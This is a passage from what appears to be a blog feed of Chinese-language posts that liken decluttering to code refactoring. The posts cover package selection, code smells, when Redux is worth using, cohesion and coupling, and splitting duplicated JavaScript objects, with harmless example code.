        <content type="html"><![CDATA[<p>大家有沒有一個經驗，出外的學子或是北漂打工族有天要搬回老家的時候，才驚覺東西怎麼這麼多? 等到要搬家前的那一刻才開始瘋狂出清堆放已久的雜物或是垃圾。</p><p>回顧一下前幾天的文章，先從<a href="https://linyencheng.github.io/2023/09/17/simplify-your-life/refactoring-with-pruning/">難以理解的程式碼</a>開始看起，就如同一團亂的人生一樣，需要好好的整理，重構的目的在於簡化，是在不改變行為和結果的情況下，讓自己更舒服的一種技巧。</p><p>接著我們從物件過多的角度切入，談到了物件變多之後所產生的<a href="https://linyencheng.github.io/2023/09/18/simplify-your-life/reduce-items-of-the-same-type/">重複問題</a>，接著延伸談到當同類型物件變多之後該怎麼進行<a href="https://linyencheng.github.io/2023/09/20/simplify-your-life/organization-of-objects-and-files/">分類</a>和<a href="https://linyencheng.github.io/2023/09/19/simplify-your-life/object-management-nine-knives-or-a-swiss-army-knife/">管理</a>。</p><p>但只是收爛攤子是不夠的，最終我們還是會回到物件過多的源頭也就是回到<a href="https://linyencheng.github.io/2023/09/21/simplify-your-life/choose-with-requirement/">需求面來看</a>，從根本問題看怎麼從來源就減少，或是評估自己擁有的<a href="https://linyencheng.github.io/2023/09/22/simplify-your-life/code-smells/">物件到底是好或是不好</a>?</p><p>在程式碼的撰寫上，最常聽到的就是不要自己造輪子，開源社群的蓬勃發展就好像現在的電商一樣在短短幾年內幾乎影響了世界的每一個角落，那開源的套件我們又該如何選擇?</p><h2 id="套件的評估與選擇"><a href="#套件的評估與選擇" class="headerlink" title="套件的評估與選擇"></a>套件的評估與選擇</h2><p>套件評估大致上會有幾個步驟</p><ol><li>明確需求: 確認自己要達成的需求，就好像買空調一樣，直接從規格就可以縮小選擇範圍</li><li>套件資料收集: 收集有關各種套件的資訊，包含功能、文件、社群、使用範例等等</li><li>測試和評估: 嘗試將套件加入到專案中，進行測試和評估</li></ol><p>網路購物大家都懂得利用比價網站跟開箱介紹，以前端來說，常用的套件評估網站是 <a href="https://npmtrends.com/">npm trends</a>，用於追蹤和比較不同 JavaScript 套件（包括 Node.js）的下載量和使用趨勢，大家可以從底下的連結點去看看前端御三家的比較:</p><p><a href="https://npmtrends.com/angular-vs-react-vs-vue">https://npmtrends.com/angular-vs-react-vs-vue</a></p><p>開源的專案來說，小編還會進一步去看該專案的 github 看看</p><ul><li>commit 的次數是否頻繁是否原子化</li><li>Github 星星數量</li><li>issue 的開單跟解決數量</li><li>套件引用的套件是不是有在更新</li><li>貢獻的人多不多</li><li>版號進版的狀況，是不是有 Change Log 或是不是有 Change Log 或是 Release Note</li><li>Quick Start 是不是真的 Quick</li><li>套件有可能包山包海，有沒有輕量化的選擇</li><li>是否有出付費版</li></ul><p>如果從架構切入，以家具裝潢來說大概就是軟裝潢跟硬裝潢，軟裝潢通常指的是室內空間中的軟質元素和家具，有比較高的可動性和可替換性，硬裝潢是指室內空間中的固定和永久性元素，通常是在建築和結構方面進行的，而且做下去更動的成本就非常高。</p><p>小編會觀察那個套件的穿透性、影響範圍、是否方便再封裝</p><ul><li>穿透性: 套件的使用是不是穿透原本程式架構的設計，像 Redux 就屬於可以穿透在每個角落的一個套件，以 Redux 來說就像是硬裝潢，裝下去之後做更動的成本就非常高</li><li>影響範圍: 是否容易被替代，跟原本的做法會不會差很多，是否需要重寫，像一般的表格換成 Aggrid 就相當於重寫</li><li>再封裝: 如果套件屬於方便再封裝的設計，那其實可動性就會非常高，就好像 Ikea 提供的各種零組件其實是有機會交互使用的</li></ul><p>不管是什麼樣的套件或是技術引入都是有成本的，所以在生活和工作中，區分「想要」和「需要」並做出明智的選擇是重要的。</p><p>想要和需要可能不同，所以須要評估後確保行動符合長期目標和價值觀，目的在節省資源、減少浪費，並專注於重要的事情。</p><p>然而，也不應該忽視「想要」，因為把錢換成其他存在的樣子可以增添生活樂趣和滿足感，技術的話就快點去開一個小專案吧，以小編來說雖然工作上大多是用熟習的工具，但就會在小專案中嘗試使用較新潮的 build tool 也因此常見的幾個都玩過一輪，甚至是大膽<a href="https://github.com/LinYenCheng/virus-and-where-to-find-them">改寫小專案成沒使用過的 svelte</a> 也是不錯的體會與經驗。</p><p>無論是在購物、工作還是生活中，好的選擇可以幫助我們保持平衡和滿足感，通過自我反省、目標設定和明確價值觀，我們可以更好地管理我們的想要和需求，從而建立更豐富、更有意義的生活。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十年後你就知道了，別人說不好就真的不好嗎?</title>
      <link href="/2023/09/22/simplify-your-life/code-smells/"/>
      <url>/2023/09/22/simplify-your-life/code-smells/</url>
      
        <content type="html"><![CDATA[<p>延續上一天慾望的源頭管理，今天想談價值與選擇，從小到大我們都會被給很多標準答案:</p><ul><li>人生就要斷捨離?</li><li>有重複的程式碼是程式碼的壞味道?</li><li>不愛讀書就是壞小孩</li></ul><p>同樣的一件事情你可以有很多不同種的解釋，甚至很多上一輩在教育上會有自己堅持的看法，大絕招大概就是十年後你就知道了。</p><p>人們有不同的觀點和價值觀，因此對於事物的評價是主觀的是相對於其他事物而言的，從這個角度來看「不好」可能只是一個個人或群體的觀點，只是取決於它在特定情境下的對比，不一定代表客觀事實。</p><blockquote><p>別人說不好不一定代表真的不好</p></blockquote><h2 id="程式碼的壞味道"><a href="#程式碼的壞味道" class="headerlink" title="程式碼的壞味道"></a>程式碼的壞味道</h2><p>評價程式碼或程式架構也是一個主觀的過程，受到個人觀點、經驗和期望的影響，一個人的不好也可能是另一個人的好。</p><p>延續之前的例子來繼續談，回顧一下專案假設今天總共用五個階段五個角色，每個角色在不同階段需要填的欄位並不相同，可以想像一個班級有不同的幹部，而班級學期報告需要大家按照各自的職掌在不同階段逐漸把內容完善。</p><ol><li><p>以管理面來說</p><ul><li>把不同階段不同角色的元件拆開，一開始我們被要求做出五個腳色要用的刀子，以刀子來說就是刀加上刀柄，但隨著時間過去不同的角色會有不同的需求，漸漸的演化成美工刀、水果刀、菜刀等等，這就是把元件拆開的作法。當需要改相同且類似的部分就會面臨到一次要改很多地方的命運，這種修改方式也被稱做散彈槍式的修改 (Shotgun Surgery)</li><li>把物件合併集中，當相同類型物件集中之後，會漸漸演化集多功能於一身的瑞士刀，這時候又會出現另外一個問題叫 Divergent Change (發散式修改) 因為你會在一個元件上長出各種奇形怪狀的東西，漸漸的變成上帝等級的全能物件 (God object)</li></ul></li><li><p>以組織和分類來說</p><ul><li>Cohesion (內聚): 簡單來說就是把全部相關的東西能放一起就放一起叫做內聚，但不知道怎麼分類的東西全部放在桶子裡就會叫垃圾桶</li><li>Coupling (耦合): 出門前你需要分別從內衣褲抽屜、衣櫃、鞋櫃分別找到需要的穿搭單品才可以出門，這就叫做耦合</li></ul></li></ol><p>把元件合在一起的時候好處是集中管理，需求更動屬於共用的地方改一次就好了，壞處是有可能因為這個修改就改壞大家共用的地方，也可能因次讓共用的地方越長越大。</p><p>把元件依照責任分開，好處是當需求越來越牛鬼蛇神，越來越「在地化」，A 說希望 <code>1 2 3 4 5</code>，B 說 <code>6 7 8 9 10</code>，這時候分開就展現出了好處，就跟兩個不同的國家一樣分開治理分開發展，即使剛開始同文同種，後來也演變成完全不同的樣貌。那壞處大概是有共用的地方就需要改好幾個，造成 Shotgun Surgery。</p><p>好與壞是一體兩面的東西，重要的是要在多個角度和標準下評價，並盡量尋求多方反饋。有時候，負面評價可能提供了改進的機會，但也可能只是基於誤解或主觀情感。</p><p>最終，我們應該尊重不同的觀點，並根據客觀標準來評價程式碼的品質，最好的程式碼評價是建立在事實和證據之上，而不僅僅是基於主觀感受。</p><blockquote><p>人生沒有好與壞，只是不一樣</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大家都說需要的源頭管理</title>
      <link href="/2023/09/21/simplify-your-life/choose-with-requirement/"/>
      <url>/2023/09/21/simplify-your-life/choose-with-requirement/</url>
      
        <content type="html"><![CDATA[<p>在前兩篇文章簡單的談過物品的<a href="https://linyencheng.github.io/2023/09/20/simplify-your-life/organization-of-objects-and-files/">分類</a>和<a href="https://linyencheng.github.io/2023/09/19/simplify-your-life/object-management-nine-knives-or-a-swiss-army-knife/">管理</a>，這篇文章想往更源頭的慾望討論。</p><blockquote><p>大家都說需要就真的需要嗎?</p></blockquote><h2 id="需求管理"><a href="#需求管理" class="headerlink" title="需求管理"></a>需求管理</h2><p>有天，小編突然就驚覺自己是不是太老了，在整理房間時發現畢業紀念冊真的有夠占空間，然後驚覺畢業後這 10-20 年一次都沒打開翻過，而且如果把名字遮起來，現在完全無法只看照片叫出名字，而且整本裡面大部分版面充滿著其他班級不認識的同學，這到底什麼爛設計，那到底當初又為什麼要跟著大家一起買?</p><p>在系統架構中，有時候可能會因為技術的新潮和複雜性而熱衷於採用最新的技術或添加多餘的功能，但這並不一定是必需的，是否有更簡單的方法達到目標?</p><p>小編年輕的時候也常常看大家說需要或覺得不錯就照著網路上的教學做下去，但沒考慮到應該要有自己思考和判斷的過程，當學習 React 的時候最常聽到的就是 Redux 架構，那我們就從這個角度切入來好好談一談。</p><p>首先，我們需要思考的是專案需要多複雜的狀態管理?</p><p>Redux 是用來管理全域的的狀態，統一定義了單向資料流的操作流程，還提供 time-travel debugging 這種走在潮流尖端的功能，好物推推，不用嗎?</p><p>但是，就是那個但是，這個好物在學習時會需要不只一些時間理解核心概念，例如 actions、reducers、store 等等，這會是開發上的基本消費，在一個小專案中，這個低消是否有點太高?</p><p>為了狀態管理定義了 actions、reducers、store 新觀念，導致專案中會重複的長出幾乎一模一樣的樣版程式，在還沒有套用工具以前我們每一次需要增加一個狀態時，能做的只有不斷的複製貼上跟前一筆幾乎一樣的 actions、reducers、store，這也是隨著時間而出現 redux-api-middleware、Redux Toolkit 等等工具的原因，透過這些工具來減少並不需要的 SOP 和 boilerplate code。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Import functions</span></span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">&quot;redux&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createAction, createReducer &#125; <span class="keyword">from</span> <span class="string">&quot;redux-act&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create an action creator (description is optional)</span></span><br><span class="line"><span class="keyword">const</span> increment = <span class="title function_">createAction</span>(<span class="string">&quot;increment the state&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> decrement = <span class="title function_">createAction</span>(<span class="string">&quot;decrement the state&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a reducer</span></span><br><span class="line"><span class="comment">// (ES6 syntax, see Advanced usage below for an alternative for ES5)</span></span><br><span class="line"><span class="keyword">const</span> counterReducer = <span class="title function_">createReducer</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    [increment]: <span class="function">(<span class="params">state</span>) =&gt;</span> state + <span class="number">1</span>,</span><br><span class="line">    [decrement]: <span class="function">(<span class="params">state</span>) =&gt;</span> state - <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">0</span> <span class="comment">// &lt;-- This is the default state</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the store</span></span><br><span class="line"><span class="keyword">const</span> counterStore = <span class="title function_">createStore</span>(counterReducer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dispatch actions</span></span><br><span class="line">counterStore.<span class="title function_">dispatch</span>(<span class="title function_">increment</span>()); <span class="comment">// counterStore.getState() === 1</span></span><br><span class="line">counterStore.<span class="title function_">dispatch</span>(<span class="title function_">decrement</span>()); <span class="comment">// counterStore.getState() === 0</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">&quot;@reduxjs/toolkit&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> initialState = &#123; <span class="attr">value</span>: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counterSlice = <span class="title function_">createSlice</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;counter&quot;</span>,</span><br><span class="line">  initialState,</span><br><span class="line">  <span class="attr">reducers</span>: &#123;</span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span>++;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">state</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span>--;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">incrementByAmount</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      state.<span class="property">value</span> += action.<span class="property">payload</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> &#123; increment, decrement, incrementByAmount &#125; = counterSlice.<span class="property">actions</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counterSlice.<span class="property">reducer</span>;</span><br></pre></td></tr></table></figure><p>所以大家都說需要就真的需要嗎? 人生可以簡單就不要複雜，狀態管理也是，小專案如果狀態簡單也沒有什麼 Debug 的困難用 useState、useReducer 就可以管理，殺雞焉用牛刀?! 但有一天狀態的量多到有點難以管理且需要追蹤時，Redux 這個強大工具的價值就會浮現，但不應該被視為所有專案的必要組成。</p><blockquote><p>適度地採納新技術，不要過度依賴單一技術或過度擴展系統</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>秩序與平衡 X 分類之道</title>
      <link href="/2023/09/20/simplify-your-life/organization-of-objects-and-files/"/>
      <url>/2023/09/20/simplify-your-life/organization-of-objects-and-files/</url>
      
        <content type="html"><![CDATA[<p>不知道該怎麼辦的衣服褲子就披在椅背上，有一天，椅子就倒了。</p><blockquote><p>分類是為了讓物品達到秩序與平衡的一門藝術。</p></blockquote><h2 id="物件的分類"><a href="#物件的分類" class="headerlink" title="物件的分類"></a>物件的分類</h2><p>一個衣櫃就像生活的一面鏡子，反映出選擇和價值觀。</p><p>分類衣物同時也為了簡化生活和尊重資源，每一件衣物都有其獨特性，就像生命中的每一個瞬間，我們的目標是不斷尋找平衡，在分類的過程中幫助我們更好地理解自己，無論是在衣櫃中還是生活中。</p><p>以衣物的分類來說，會看屬性分得多細，若是分類比較粗一點，當衣服的數量變多就會變成很難找到整套運動服該如何正確搭配，屬性分類用衣服的概念來看就是分類成</p><ul><li>全部的內衣</li><li>全部的內褲</li><li>全部的褲子</li><li>全部的上衣</li><li>全部的外套</li></ul><p>當衣服變多的時候也知道怎麼依照功能找到全部相關的配套，不過由於依照功能區分，就會需要比較多的種類，功能分類就會是</p><ul><li>慢跑外套、上衣、褲子、內衣、內褲</li><li>登山外套、上衣、褲子、內衣、內褲</li><li>約會外套、上衣、褲子、內衣、內褲</li><li>上班外套、上衣、褲子、內衣、內褲</li><li>居家外套、上衣、褲子、內衣、內褲</li><li>休閒外套、上衣、褲子、內衣、內褲</li></ul><h2 id="Cohesion-內聚-與-Coupling-耦合"><a href="#Cohesion-內聚-與-Coupling-耦合" class="headerlink" title="Cohesion (內聚) 與 Coupling (耦合)"></a>Cohesion (內聚) 與 Coupling (耦合)</h2><p>在程式設計上有個重要的觀念請各位大大可以記住</p><blockquote><p>高內聚，低耦合</p></blockquote><ul><li>Cohesion (內聚): 簡單來說就是把全部相關的東西能放一起就放一起叫做內聚，但不知道怎麼分類的東西全部放在桶子裡就會叫垃圾桶</li><li>Coupling (耦合): 出門前你需要分別從內衣褲抽屜、衣櫃、鞋櫃分別找到需要的穿搭單品才可以出門，這就叫做耦合</li></ul><p>要做到不耦合其實並不容易，以上面衣物分類的例子來說，正常人都是會依照功能去進行搭配和穿著，所以會在 “概念上” 耦合，但 “實做上” 還是依照屬性來做內聚的實作。</p><p>舉三個例子來看看</p><ol><li>如果不在意眼光，其實也可以穿 Polo 衫去運動或是穿著運動褲去上班，衣服跟褲子只有在概念上進行耦合</li><li>車上的導航機來說只有在裝機的當下耦合，原廠車機大部分都能改裝成第三方廠商有更多功能的版本，僅需要轉接頭來配合不同廠牌</li><li>宗教透過精神上讓大家可以因為一個概念而聚集是好事，但如果要求雙修在肉體上進行 “耦合” 就會出現問題</li></ol><p>所以我們在程式設計或是專案架構上就要盡量做到只有 “概念上” 的耦合，去避免 “實作上” 的耦合，在物件和檔案的分類上則要盡量依照當下的情境去做管理面的內聚。</p><p>分類之道最終是在追求物品的秩序與平衡，不管是檔案分類、功能分類、錯誤處理的分類都可以讓我們的工作更加的輕鬆。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物件的管理，你想要九把刀還是瑞士刀</title>
      <link href="/2023/09/19/simplify-your-life/object-management-nine-knives-or-a-swiss-army-knife/"/>
      <url>/2023/09/19/simplify-your-life/object-management-nine-knives-or-a-swiss-army-knife/</url>
      
        <content type="html"><![CDATA[<p>大家不知道有沒有過一種經驗，新買的東西包裝都沒拆結果一直放著，堆在箱子或是櫃子中一放就是好幾年，我知道我買了一堆要用，然後就沒有然後了。</p><p>軟體開發來說這就像沒有經過好好管理的程式碼，留下了很多其實沒用到但大家也不敢刪除的邏輯，專案需求管理的表單沒有經過是當的標記跟篩選，久了大家也不再認真看，也沒有然後了。</p><blockquote><p>整理東西應該是依照物品來做分類和整理，而非依照場所。</p></blockquote><h2 id="物件的管理"><a href="#物件的管理" class="headerlink" title="物件的管理"></a>物件的管理</h2><p>這是在上一篇文章的結論，那在實際上會是什麼意思?</p><p>小編在另外一篇文章<a href="https://linyencheng.github.io/2022/09/30/relationships-between-frontend-and-backend/project-folder-structure/">前任物品斷捨離 X 專案資料夾架構與收納</a>，有簡單快速的提到專案資料夾架構怎麼依照屬性或是功能分類，依照檔案的多寡和專案的大小各自會有各自的好處，但實際上都會以物品本質為出發點，像是按照衣服、褲子、內搭、外套去做屬性分類，但量一多就會變成很難找到整套運動服。</p><p>上一篇文章專案的中例子小編覺得真的是教案等級，所以延續來繼續談，回顧一下專案假設今天總共用五個階段五個角色，每個角色在不同階段需要填的欄位並不相同，可以想像一個班級有不同的幹部，而班級學期報告需要大家按照各自的職掌在不同階段逐漸把內容完善。</p><p>我們一樣針對元件會有兩種選擇</p><ul><li>把不同階段不同角色的元件拆開，小編當時講了一個比喻給同事們聽，一開始我們被要求做出五個腳色要用的刀子，以刀子來說就是刀加上刀柄，但隨著時間過去不同的角色會有不同的需求，漸漸的演化成美工刀、水果刀、菜刀等等，這就是把元件拆開的作法。當需要改相同且類似的部分就會面臨到一次要改很多地方的命運，這種修改方式也被稱做散彈槍式的修改 (Shotgun Surgery)</li><li>把物件合併集中，當相同類型物件集中之後，會漸漸演化集多功能於一身的瑞士刀，這時候又會出現另外一個問題叫 Divergent Change (發散式修改) 因為你會在一個元件上長出各種奇形怪狀的東西，漸漸的變成上帝等級的全能物件 (God object)</li></ul><h2 id="Kanban"><a href="#Kanban" class="headerlink" title="Kanban"></a>Kanban</h2><p>在專案管理上，有一個簡單但很容易有效果的方法叫做 Kanban 他的概念也是依照任務的本質去做分類，直接把相關的任務都集中在一起。</p><p>舉例來說家事就可以分成三塊</p><ul><li>待處理（To-Do）：這個區域包含家庭中需要完成的所有任務，例如購物清單、家務事項、或是需要安排的活動</li><li>進行中（In Progress）：當你或你的家人開始處理某個任務時，你可以將該任務從待處理區移動到進行中區</li><li>已完成（Done）：當一個任務完成時，你可以將它移到已完成區域</li></ul><p>所以今天如果給你選，你會選擇九把刀還是瑞士刀呢?! 其實選擇並沒有絕對的好或壞，其實都可以依照當下的時程、團隊組成來決定。</p>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同類型的東西一再出現</title>
      <link href="/2023/09/18/simplify-your-life/reduce-items-of-the-same-type/"/>
      <url>/2023/09/18/simplify-your-life/reduce-items-of-the-same-type/</url>
      
        <content type="html"><![CDATA[<p>延續上一篇文章 “該好好重構和斷捨離的是程式碼還是人生” 中可怕的例子，這篇文章我們來看看同類型的東西一再出現該怎麼辦。</p><h2 id="重複的物件"><a href="#重複的物件" class="headerlink" title="重複的物件"></a>重複的物件</h2><p>在生活中擁有什麼東西，等同於自己的價值觀，有時候總是害怕未來缺少什麼，所以在生活中我們習慣提早購買備品，仔細想想大家的家裡是不是都有非常多的牙刷、牙膏、衛生紙呢?! 而實際上我們只需要一條牙膏跟一隻牙刷。</p><p>在寫程式中，時常會提醒我們把重複的地方合而為一，不過重複真的不好嗎?!</p><p>小編曾改過一個專案，起初專案就是表格元件但有多個階段畫面用到，隨著時間過去那個表格在不同的階段需要依照角色有著不同的權限控管。</p><p>假設今天總共用五個階段五個角色，每個角色在不同階段需要填的欄位並不相同，可以想像一個班級有不同的幹部，而班級學期報告需要大家按照各自的職掌在不同階段逐漸把內容完善。</p><p>在開發階段我們需要高頻率同時的測試不同階段和不同角色，在這個階段我們可以選擇</p><ul><li>把不同階段不同角色的元件拆開: 會發現同類型的東西一再出現，但好處是什麼，這個系統在分別修改拆開的元件時並不會影響整個流程與其他角色的行為，系統的可容錯性是較高的，也比較容易快速的開發和測試</li><li>把不同階段不同角色的元件合在一起: 雖然減少了重複的東西，但會將傳入的參數還有元件中的邏輯變得更加複雜</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拆開</span></span><br><span class="line"><span class="comment">// 初始版本只有基本角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家1&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一段時間後，遊戲需要更多的角色屬性</span></span><br><span class="line"><span class="keyword">const</span> player2 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;玩家2&quot;</span>,</span><br><span class="line">  <span class="attr">level</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="attr">health</span>: <span class="number">150</span>,</span><br><span class="line">  <span class="attr">damage</span>: <span class="number">15</span>,</span><br><span class="line">  <span class="attr">agility</span>: <span class="number">20</span>, <span class="comment">// 新需求：敏捷度</span></span><br><span class="line">  <span class="attr">inventory</span>: [<span class="string">&quot;劍&quot;</span>, <span class="string">&quot;盾&quot;</span>], <span class="comment">// 新需求：背包</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合起來</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  name,</span></span><br><span class="line"><span class="params">  level,</span></span><br><span class="line"><span class="params">  health,</span></span><br><span class="line"><span class="params">  damage,</span></span><br><span class="line"><span class="params">  agility,</span></span><br><span class="line"><span class="params">  inventory,</span></span><br><span class="line"><span class="params">  statusCode</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    health &gt; <span class="number">10</span> &amp;&amp;</span><br><span class="line">    (name === <span class="string">&quot;foo&quot;</span> || damage &lt; <span class="number">5</span>) &amp;&amp;</span><br><span class="line">    (name !== <span class="string">&quot;bar&quot;</span> || agility &gt; <span class="number">20</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在這樣的情境下，不管是拆開或是合起來都會產生些許問題，大大們怎麼看?!</p><p>剛剛的例子來說也許我會至少先分類，參數分成必要跟選填</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processPlayerData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  &#123; name, level, health, damage &#125;,</span></span><br><span class="line"><span class="params">  &#123; agility, inventory, statusCode &#125;</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    health &gt; <span class="number">10</span> &amp;&amp;</span><br><span class="line">    (name === <span class="string">&quot;foo&quot;</span> || damage &lt; <span class="number">5</span>) &amp;&amp;</span><br><span class="line">    (name !== <span class="string">&quot;bar&quot;</span> || agility &gt; <span class="number">20</span>)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 非常長的函數內容...</span></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20100</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (statusCode === <span class="number">20101</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著把必要、選填相關的判斷分別先抽出來且變成比較好懂的敘述</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 